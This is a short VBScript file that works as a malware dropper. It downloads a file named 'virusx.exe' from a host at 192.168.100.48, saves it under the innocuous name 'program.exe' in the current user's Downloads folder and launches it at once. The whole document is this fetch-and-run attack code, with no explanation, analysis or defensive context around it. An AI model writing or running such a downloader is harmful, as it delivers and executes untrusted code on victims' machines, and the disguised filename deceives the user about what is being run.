Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objADOStream = CreateObject("ADODB.Stream")
Set objFSO = CreateObject("Scripting.FileSystemObject")

url = "http://192.168.100.48/virusx.exe"
path = "C:\Users\" & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%") & "\Downloads\program.exe"

objXMLHTTP.Open "GET", url, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile path, 2
    objADOStream.Close

    Set shell = CreateObject("WScript.Shell")
    shell.Run Chr(34) & path & Chr("34"), 1, False
Else
    MsgBox "error"
End If